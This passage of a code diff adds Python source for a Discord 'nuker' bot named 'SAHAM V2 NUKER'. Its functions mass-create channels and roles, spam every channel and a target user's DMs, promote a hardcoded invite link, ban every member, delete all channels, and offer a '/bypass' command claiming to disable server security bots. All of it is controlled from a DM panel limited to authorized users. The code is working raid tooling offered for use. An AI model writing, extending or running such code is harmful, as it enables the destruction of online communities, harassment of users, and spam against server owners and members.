+                description="Invalid User ID! (Numbers only)",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+# ============ REMOVE BYPASS MODAL ============ #
+class RemoveBypassModal(discord.ui.Modal):
+    def __init__(self):
+        super().__init__(title="Remove Bypass User")
+
+        self.user_id = discord.ui.TextInput(
+            label="User ID",
+            placeholder="Enter the user ID to remove",
+            required=True,
+            min_length=1,
+            max_length=20
+        )
+        self.add_item(self.user_id)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+
+        if interaction.user.id != OWNER_ID:
+            embed = discord.Embed(
+                title="❌ OWNER ONLY",
+                description=f"Only the bot owner can use this command!\nYour ID: `{interaction.user.id}`\nOwner ID: `{OWNER_ID}`",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+            return
+
+        try:
+            user_id = int(self.user_id.value.strip())
+
+            if remove_bypass_user(user_id):
+                embed = discord.Embed(
+                    title="✅ BYPASS USER REMOVED",
+                    description=f"User `{user_id}` has been removed from bypass!",
+                    color=discord.Color.green()
+                )
+            else:
+                embed = discord.Embed(
+                    title="ℹ️ NOT FOUND",
+                    description=f"User `{user_id}` was not in the bypass list!",
+                    color=discord.Color.blue()
+                )
+
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+        except ValueError:
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description="Invalid User ID! (Numbers only)",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+# ============ NUKE FUNCTIONS - MAXIMUM SPEED ============ #
+
+async def create_channels_custom(guild, channel_name, channel_type, total_count, user_id):
+    """Create custom channels - Text or Voice - Custom count"""
+    created = 0
+    failed = 0
+
+    try:
+        user = await bot.fetch_user(user_id)
+        embed = discord.Embed(
+            title="▶️ STARTING CHANNEL CREATION",
+            description=f"**Name:** {channel_name}\n**Type:** {'Text' if channel_type == 'T' else 'Voice'}\n**Total:** {total_count} channels\n**Speed:** MAX",
+            color=discord.Color.blue()
+        )
+        nuke_message = await user.send(embed=embed)
+        user_sessions[user_id] = {"nuke_messages": [nuke_message.id]}
+    except:
+        pass
+
+    tasks = []
+    for i in range(total_count):
+        async def create_channel(index):
+            nonlocal created, failed
+            try:
+                if channel_type == "T":
+                    await guild.create_text_channel(f"{channel_name}-{index+1}")
+                else:  # V for Voice
+                    await guild.create_voice_channel(f"{channel_name}-{index+1}")
+                created += 1
+                if (index + 1) % 50 == 0:
+                    print(f"✅ {index+1}/{total_count} channels created")
+            except Exception as e:
+                failed += 1
+                print(f"❌ Channel creation failed: {e}")
+            await asyncio.sleep(CHANNEL_CREATE_DELAY)
+        
+        tasks.append(create_channel(i))
+    
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+    try:
+        user = await bot.fetch_user(user_id)
+        embed = discord.Embed(
+            title="✅ CHANNELS CREATED",
+            description=f"**Success:** {created}\n**Failed:** {failed}\n**Total:** {total_count}",
+            color=discord.Color.blue()
+        )
+        embed.set_footer(text="Only you can see this")
+        msg = await user.send(embed=embed)
+        if user_id in user_sessions:
+            user_sessions[user_id]["nuke_messages"].append(msg.id)
+    except:
+        pass
+
+async def create_and_spam_channels_nuke(guild, channel_name, spam_content, total_count, user_id):
+    """Create channel and immediately spam - 5 messages per channel"""
+    created = 0
+    total_spam = 0
+    failed = 0
+
+    try:
+        user = await bot.fetch_user(user_id)
+        embed = discord.Embed(
+            title="▶️ STARTING CONCURRENT CHANNEL CREATE & SPAM",
+            description=f"**Channel Name:** {channel_name}\n**Total Channels:** {total_count}\n**Spam/Channel:** 5 messages\n**Status:** MAX SPEED",
+            color=discord.Color.blue()
+        )
+        nuke_message = await user.send(embed=embed)
+        user_sessions[user_id] = {"nuke_messages": [nuke_message.id]}
+    except:
+        pass
+
+    async def create_and_spam_single():
+        nonlocal created, total_spam, failed
+        
+        for i in range(total_count):
+            try:
+                # Create channel
+                channel = await guild.create_text_channel(f"{channel_name}-{i+1}")
+                created += 1
+                
+                # Immediately spam 5 messages to this channel
+                for msg_num in range(5):
+                    try:
+                        await channel.send(spam_content)
+                        total_spam += 1
+                        await asyncio.sleep(MESSAGE_SEND_DELAY)
+                    except:
+                        failed += 1
+                        await asyncio.sleep(MESSAGE_SEND_DELAY)
+                
+                if (i + 1) % 50 == 0:
+                    print(f"✅ {i+1}/{total_count} channels created & spammed")
+                    try:
+                        user = await bot.fetch_user(user_id)
+                        embed = discord.Embed(
+                            title="⏳ PROGRESS",
+                            description=f"**Channels:** {created}\n**Messages:** {total_spam}\n**Progress:** {i+1}/{total_count}",
+                            color=discord.Color.yellow()
+                        )
+                        embed.set_footer(text="Only you can see this")
+                        msg = await user.send(embed=embed)
+                        if user_id in user_sessions:
+                            user_sessions[user_id]["nuke_messages"].append(msg.id)
+                    except:
+                        pass
+                
+                await asyncio.sleep(CHANNEL_CREATE_DELAY)
+            except Exception as e:
+                failed += 1
+                print(f"❌ Failed: {e}")
+                await asyncio.sleep(CHANNEL_CREATE_DELAY)
+
+    await create_and_spam_single()
+
+    try:
+        user = await bot.fetch_user(user_id)
+        embed = discord.Embed(
+            title="✅ CHANNELS & SPAM COMPLETED",
+            description=f"**Channels Created:** {created}\n**Messages Sent:** {total_spam}\n**Failed:** {failed}",
+            color=discord.Color.blue()
+        )
+        embed.set_footer(text="Only you can see this")
+        msg = await user.send(embed=embed)
+        if user_id in user_sessions:
+            user_sessions[user_id]["nuke_messages"].append(msg.id)
+    except:
+        pass
+
+async def spam_all_channels(guild, message_text, user_id):
+    """Spam all channels concurrently - very fast"""
+    total_sent = 0
+    failed = 0
+    channels = guild.text_channels
+
+    if not channels:
+        try:
+            user = await bot.fetch_user(user_id)
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description="No text channels found in this server!",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await user.send(embed=embed, ephemeral=True)
+        except:
+            pass
+        return
+
+    try:
+        user = await bot.fetch_user(user_id)
+        embed = discord.Embed(
+            title="▶️ STARTING SPAM - CONCURRENT MODE",
+            description=f"**Message:** {message_text[:50]}...\n**Total Channels:** {len(channels)}\n**Speed:** MAX (CONCURRENT)",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await user.send(embed=embed, ephemeral=True)
+    except:
+        pass
+
+    # Distribute to all channels
+    async def spam_channel_concurrent(channel):
+        nonlocal total_sent, failed
+        try:
+            # Send message to each channel multiple times
+            for _ in range(10):  # Multiple spam cycles per channel
+                try:
+                    await channel.send(message_text)
+                    total_sent += 1
+                    await asyncio.sleep(MESSAGE_SEND_DELAY)
+                except:
+                    failed += 1
+                    await asyncio.sleep(MESSAGE_SEND_DELAY)
+        except Exception as e:
+            print(f"❌ Channel spam error: {e}")
+
+    # Concurrent spam to all channels
+    tasks = [spam_channel_concurrent(channel) for channel in channels]
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+    try:
+        user = await bot.fetch_user(user_id)
+        embed = discord.Embed(
+            title="✅ SPAM COMPLETED",
+            description=f"**Messages Sent:** {total_sent}\n**Failed:** {failed}\n**Channels:** {len(channels)}",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await user.send(embed=embed, ephemeral=True)
+    except:
+        pass
+
+async def ban_all_members(guild, interaction, user_id):
+    banned = 0
+    failed = 0
+
+    try:
+        user = await bot.fetch_user(user_id)
+        embed = discord.Embed(
+            title="▶️ STARTING BAN - MAX SPEED",
+            description="Banning all members...",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await user.send(embed=embed, ephemeral=True)
+    except:
+        pass
+
+    members = list(guild.members)
+    
+    async def ban_member(member):
+        nonlocal banned, failed
+        if member.bot or member == guild.owner:
+            return
+        try:
+            await member.ban(reason="Nuked by bot")
+            banned += 1
+            await asyncio.sleep(BAN_DELAY)
+        except Exception as e:
+            failed += 1
+            await asyncio.sleep(BAN_DELAY)
+
+    tasks = [ban_member(m) for m in members]
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+    try:
+        user = await bot.fetch_user(user_id)
+        embed = discord.Embed(
+            title="✅ BAN COMPLETED",
+            description=f"**Banned:** {banned}\n**Failed:** {failed}",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await user.send(embed=embed, ephemeral=True)
+    except:
+        pass
+
+async def ban_all_members_auto(guild, user_id):
+    banned = 0
+    failed = 0
+
+    try:
+        user = await bot.fetch_user(user_id)
+        embed = discord.Embed(
+            title="▶️ STARTING BAN - MAX SPEED",
+            description="Banning all members...",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        msg = await user.send(embed=embed)
+        if user_id in user_sessions:
+            user_sessions[user_id]["nuke_messages"].append(msg.id)
+    except:
+        pass
+
+    members = list(guild.members)
+    
+    async def ban_member(member):
+        nonlocal banned, failed
+        if member.bot or member == guild.owner:
+            return
+        try:
+            await member.ban(reason="Nuked by bot")
+            banned += 1
+            await asyncio.sleep(BAN_DELAY)
+        except Exception as e:
+            failed += 1
+            await asyncio.sleep(BAN_DELAY)
+
+    tasks = [ban_member(m) for m in members]
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+    try:
+        user = await bot.fetch_user(user_id)
+        embed = discord.Embed(
+            title="✅ BAN COMPLETED",
+            description=f"**Banned:** {banned}\n**Failed:** {failed}",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        msg = await user.send(embed=embed)
+        if user_id in user_sessions:
+            user_sessions[user_id]["nuke_messages"].append(msg.id)
+    except:
+        pass
+
+async def delete_all_channels(guild, interaction, user_id):
+    deleted = 0
+    failed = 0
+
+    try:
+        user = await bot.fetch_user(user_id)
+        embed = discord.Embed(
+            title="▶️ STARTING CHANNEL DELETION - MAX SPEED",
+            description="Deleting all channels...",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await user.send(embed=embed, ephemeral=True)
+    except:
+        pass
+
+    channels = list(guild.channels)
+    
+    async def delete_channel(channel):
+        nonlocal deleted, failed
+        try:
+            await channel.delete()
+            deleted += 1
+            await asyncio.sleep(CHANNEL_CREATE_DELAY)
+        except Exception as e:
+            failed += 1
+            await asyncio.sleep(CHANNEL_CREATE_DELAY)
+
+    tasks = [delete_channel(c) for c in channels]
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+    try:
+        user = await bot.fetch_user(user_id)
+        embed = discord.Embed(
+            title="✅ CHANNELS DELETED",
+            description=f"**Deleted:** {deleted}\n**Failed:** {failed}",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await user.send(embed=embed, ephemeral=True)
+    except:
+        pass
+
+async def create_200_roles(guild, role_name, user_id):
+    created = 0
+    failed = 0
+
+    try:
+        user = await bot.fetch_user(user_id)
+        embed = discord.Embed(
+            title="▶️ STARTING ROLE CREATION - MAX SPEED",
+            description=f"**Role Name:** {role_name}\n**Total:** 200 roles",
+            color=discord.Color.from_rgb(0, 0, 0)
+        )
+        embed.set_footer(text="Only you can see this")
+        await user.send(embed=embed, ephemeral=True)
+    except:
+        pass
+
+    tasks = []
+    for i in range(200):
+        async def create_role(index):
+            nonlocal created, failed
+            try:
+                await guild.create_role(name=f"{role_name}-{index+1}", color=discord.Color.random())
+                created += 1
+                if (index + 1) % 50 == 0:
+                    print(f"✅ {index+1}/200 roles created")
+            except Exception as e:
+                failed += 1
+                print(f"❌ Role creation failed: {e}")
+            await asyncio.sleep(ROLE_CREATE_DELAY)
+        
+        tasks.append(create_role(i))
+
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+    try:
+        user = await bot.fetch_user(user_id)
+        embed = discord.Embed(
+            title="✅ ROLES CREATED",
+            description=f"**Success:** {created}\n**Failed:** {failed}",
+            color=discord.Color.from_rgb(0, 0, 0)
+        )
+        embed.set_footer(text="Only you can see this")
+        await user.send(embed=embed, ephemeral=True)
+    except:
+        pass
+
+async def delete_nuke_messages(user_id):
+    try:
+        if user_id in user_sessions and "nuke_messages" in user_sessions[user_id]:
+            user = await bot.fetch_user(user_id)
+            async for message in user.dm_channel.history(limit=200):
+                if message.id in user_sessions[user_id]["nuke_messages"]:
+                    await message.delete()
+            user_sessions[user_id]["nuke_messages"] = []
+    except Exception as e:
+        print(f"❌ Failed to delete nuke messages: {e}")
+
+# ============ BOT COMMANDS ============ #
+
+@bot.event
+async def on_ready():
+    try:
+        synced = await bot.tree.sync()
+        print(f"✅ Synced {len(synced)} command(s)")
+    except Exception as e:
+        print(f"❌ Error: {e}")
+    print(f"✅ Bot Logged in as: {bot.user}")
+
+@bot.tree.command(name="bypass", description="🔐 Bypass Security Protection")
+async def bypass_command(interaction: discord.Interaction):
+    """Bypass command - Generate bypass invite link for any bot"""
+    if not is_bypass_authorized(interaction.user.id):
+        embed = discord.Embed(
+            title="❌ UNAUTHORIZED",
+            description=f"You are not authorized to use /bypass!\n**Your ID:** `{interaction.user.id}`",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    if not isinstance(interaction.channel, discord.DMChannel):
+        await interaction.response.send_message("❌ This command only works in DM!", ephemeral=True)
+        return
+
+    user_id = interaction.user.id
+
+    embed = discord.Embed(
+        title="🔐 SECURITY PROTECTION BYPASS",
+        description="**Generate Bypass Invite Link** for any Bot\n\n• Bot joins with **ZERO PERMISSIONS**\n• Security automatically **DISABLED**\n• Target bot cannot control server",
+        color=discord.Color.orange()
+    )
+    embed.add_field(name="⚠️ WARNING", value="The target bot will have **NO ADMIN POWERS**", inline=False)
+    embed.set_footer(text="Only you can see this")
+
+    view = BypassButtonView(user_id)
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+@bot.tree.command(name="spamraid", description="Spam message in DM or Server")
+@app_commands.describe(
+    message="Message to spam",
+    delay="Delay between messages in seconds (0-5)"
+)
+async def spamraid(interaction: discord.Interaction, message: str, delay: int = 0):
+    if delay < 0 or delay > 5:
+        embed = discord.Embed(
+            title="❌ ERROR",
+            description="Delay must be between 0 and 5 seconds!",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    if not is_authorized(interaction.user.id):
+        embed = discord.Embed(
+            title="❌ UNAUTHORIZED",
+            description=f"You are not authorized to use this bot!\n**Your ID:** `{interaction.user.id}`",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    view = SpamButton(message, delay)
+
+    embed = discord.Embed(
+        title="💥 SPAM TEXT",
+        description=f"**Message:** `{message}`\n**Delay:** {delay}s",
+        color=discord.Color.red()
+    )
+    embed.add_field(name="📊 SELECT SPAM COUNT", value="Click button below", inline=False)
+    embed.set_footer(text="Only you can see this")
+
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+@bot.tree.command(name="dmspamuser", description="Direct spam to any user's DM")
+async def dmspamuser(interaction: discord.Interaction):
+    if not is_authorized(interaction.user.id):
+        embed = discord.Embed(
+            title="❌ UNAUTHORIZED",
+            description=f"You are not authorized to use this bot!\n**Your ID:** `{interaction.user.id}`",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    modal = DMSpamUserModal()
+    await interaction.response.send_modal(modal)
+
+@bot.tree.command(name="spamembed", description="Spam embed with invite link")
+@app_commands.describe(
+    title="Embed title",
+    description="Embed description",
+    color="Embed color (red/blue/green/yellow)",
+    link="Invite link to spam",
+    delay="Delay between messages in seconds (0-5)"
+)
+async def spamembed(
+    interaction: discord.Interaction,
+    title: str,
+    description: str,
+    color: str = "red",
+    link: str = "https://discord.gg/gWsJJxnGUT",
+    delay: int = 0
+):
+    if delay < 0 or delay > 5:
+        embed = discord.Embed(
+            title="❌ ERROR",
+            description="Delay must be between 0 and 5 seconds!",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    if not is_authorized(interaction.user.id):
+        embed = discord.Embed(
+            title="❌ UNAUTHORIZED",
+            description=f"You are not authorized to use this bot!",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    color_map = {
+        "red": discord.Color.red(),
+        "blue": discord.Color.blue(),
+        "green": discord.Color.green(),
+        "yellow": discord.Color.yellow(),
+        "purple": discord.Color.purple(),
+        "orange": discord.Color.orange(),
+    }
+
+    selected_color = color_map.get(color.lower(), discord.Color.red())
+
+    embed = discord.Embed(
+        title=title,
+        description=description,
+        color=selected_color
+    )
+    embed.set_footer(text="Only you can see this")
+
+    view = SpamEmbedButton(embed, link, delay)
+
+    await interaction.response.send_message(
+        f"**Preview** (Delay: {delay}s):",
+        embed=embed,
+        view=view,
+        ephemeral=True
+    )
+
+@bot.tree.command(name="panel", description="Open Nuke Control Panel - PREMIUM")
+async def panel_command(interaction: discord.Interaction):
+    if not is_authorized(interaction.user.id):
+        embed = discord.Embed(
+            title="❌ UNAUTHORIZED",
+            description=f"You are not authorized to use this bot!\n**Your ID:** `{interaction.user.id}`",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        print(f"⚠️ Unauthorized access attempt by {interaction.user.id}")
+        return
+
+    if not isinstance(interaction.channel, discord.DMChannel):
+        await interaction.response.send_message("❌ This command only works in DM!", ephemeral=True)
+        return
+
+    user_id = interaction.user.id
+
+    embed = discord.Embed(
+        title="⚡ SAHAM V2 // NUKER ⚡",
+        description="> CONTROL PANEL\n🔥 **PREMIUM VERSION - MAXIMUM SPEED** 🔥",
+        color=discord.Color.from_rgb(255, 0, 0)
+    )
+    embed.set_footer(text="Only you can see this")
+
+    view = SelectGuildButton(user_id)
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+@bot.tree.command(name="myid", description="Check your Discord User ID")
+async def myid_command(interaction: discord.Interaction):
+    embed = discord.Embed(
+        title="👤 YOUR USER ID",
+        description=f"`{interaction.user.id}`",
+        color=discord.Color.blue()
+    )
+    embed.set_footer(text="Only you can see this")
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="checkowner", description="Check if you are owner")
+async def checkowner_command(interaction: discord.Interaction):
+    is_owner = interaction.user.id == OWNER_ID
+
+    if is_owner:
+        embed = discord.Embed(
+            title="✅ YOU ARE OWNER",
+            description=f"Your ID: `{interaction.user.id}`\nOwner ID: `{OWNER_ID}`",
+            color=discord.Color.green()
+        )
+    else:
+        embed = discord.Embed(
+            title="❌ YOU ARE NOT OWNER",
+            description=f"Your ID: `{interaction.user.id}`\nOwner ID: `{OWNER_ID}`",
+            color=discord.Color.red()
+        )
+
+    embed.set_footer(text="Only you can see this")
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="addauth", description="Add authorized user (Owner only)")
+async def addauth_command(interaction: discord.Interaction):
+    if interaction.user.id != OWNER_ID:
+        embed = discord.Embed(
+            title="❌ OWNER ONLY",
+            description=f"Only the bot owner can use this command!\nYour ID: `{interaction.user.id}`\nOwner ID: `{OWNER_ID}`",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    modal = AddAuthModal()
+    await interaction.response.send_modal(modal)
+
+@bot.tree.command(name="removeauth", description="Remove authorized user (Owner only)")
+async def removeauth_command(interaction: discord.Interaction):
+    if interaction.user.id != OWNER_ID:
+        embed = discord.Embed(
+            title="❌ OWNER ONLY",
+            description=f"Only the bot owner can use this command!\nYour ID: `{interaction.user.id}`\nOwner ID: `{OWNER_ID}`",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    modal = RemoveAuthModal()
+    await interaction.response.send_modal(modal)
+
+@bot.tree.command(name="addbypass", description="Add bypass user (Owner only)")
+async def addbypass_command(interaction: discord.Interaction):
+    if interaction.user.id != OWNER_ID:
+        embed = discord.Embed(
+            title="❌ OWNER ONLY",
+            description=f"Only the bot owner can use this command!\nYour ID: `{interaction.user.id}`\nOwner ID: `{OWNER_ID}`",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    modal = AddBypassModal()
+    await interaction.response.send_modal(modal)
+
+@bot.tree.command(name="removebypass", description="Remove bypass user (Owner only)")
+async def removebypass_command(interaction: discord.Interaction):
+    if interaction.user.id != OWNER_ID:
+        embed = discord.Embed(
+            title="❌ OWNER ONLY",
+            description=f"Only the bot owner can use this command!\nYour ID: `{interaction.user.id}`\nOwner ID: `{OWNER_ID}`",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    modal = RemoveBypassModal()
+    await interaction.response.send_modal(modal)
+
+@bot.tree.command(name="authlist", description="Show authorized users (Owner only)")
+async def authlist_command(interaction: discord.Interaction):
+    if interaction.user.id != OWNER_ID:
+        embed = discord.Embed(
+            title="❌ OWNER ONLY",
+            description=f"Only the bot owner can use this command!\nYour ID: `{interaction.user.id}`\nOwner ID: `{OWNER_ID}`",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    users = load_authorized_users()
+    if users:
+        user_list = "\n".join([f"• `{uid}`" for uid in users])
+        embed = discord.Embed(
+            title="✅ AUTHORIZED USERS (Panel/Spam)",
+            description=user_list,
+            color=discord.Color.green()
+        )
+    else:
+        embed = discord.Embed(
+            title="ℹ️ NO AUTHORIZED USERS",
+            description="No users are currently authorized!",
+            color=discord.Color.blue()
+        )
+
+    embed.set_footer(text=f"Total: {len(users)} user(s) • Only you can see this")
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="bypasslist", description="Show bypass users (Owner only)")
+async def bypasslist_command(interaction: discord.Interaction):
+    if interaction.user.id != OWNER_ID:
+        embed = discord.Embed(
+            title="❌ OWNER ONLY",
+            description=f"Only the bot owner can use this command!\nYour ID: `{interaction.user.id}`\nOwner ID: `{OWNER_ID}`",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    users = load_bypass_users()
+    if users:
+        user_list = "\n".join([f"• `{uid}`" for uid in users])
+        embed = discord.Embed(
+            title="✅ BYPASS USERS",
+            description=user_list,
+            color=discord.Color.green()
+        )
+    else:
+        embed = discord.Embed(
+            title="ℹ️ NO BYPASS USERS",
+            description="No users are currently authorized for bypass!",
+            color=discord.Color.blue()
+        )
+
+    embed.set_footer(text=f"Total: {len(users)} user(s) • Only you can see this")
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="help", description="Show available commands")
+async def help_command(interaction: discord.Interaction):
+    embed = discord.Embed(
+        title="💥 SAHAM V2 NUKER - COMMANDS",
+        description="Premium Bot • Maximum Speed\n⚡ **LIGHTNING FAST OPERATIONS** ⚡",
+        color=discord.Color.red()
+    )
+
+    embed.add_field(
+        name="📊 SPAM COMMANDS (Authorization Required)",
+        value="`/spamraid` 🟢 - Spam text (1X/10X/16X)\n`/dmspamuser` 💌 - Spam user DM\n`/spamembed` 🎨 - Spam embed",
+        inline=False
+    )
+
+    embed.add_field(
+        name="🔐 BYPASS COMMAND (Bypass Authorization Required)",
+        value="`/bypass` 🔓 - Bypass Security Protection\n• Generate zero-permission invite links\n• Disable target bot admin powers",
+        inline=False
+    )
+
+    embed.add_field(
+        name="💥 NUKE COMMANDS (Authorization Required - PREMIUM)",
+        value="`/panel` 🎮 - Open Nuke Control Panel (DM only)\n• **Create Channels:** Custom count (T/V)\n• **Spam Channels:** Concurrent (FAST)\n• **Ban All:** Concurrent\n• **Delete All:** Concurrent\n• **Complete Nuke:** All in one",
+        inline=False
+    )
+
+    embed.add_field(
+        name="👤 ADMIN COMMANDS (Owner Only)",
+        value="`/addauth` ➕ - Add panel/spam user\n`/removeauth` ➖ - Remove panel/spam user\n`/addbypass` ➕ - Add bypass user\n`/removebypass` ➖ - Remove bypass user\n`/authlist` 📋 - Show panel/spam users\n`/bypasslist` 📋 - Show bypass users",
+        inline=False
+    )
+
+    embed.set_footer(text="Only you can see this")
+
+    await interaction.response.send_message(embed=embed)
+
+if __name__ == "__main__":
+    TOKEN = load_token()
+
+    if TOKEN:
+        try:
+            bot.run(TOKEN)
+        except discord.LoginFailure:
+            print("❌ Invalid token!")
+    else:
+        print("❌ TOKEN not found!")
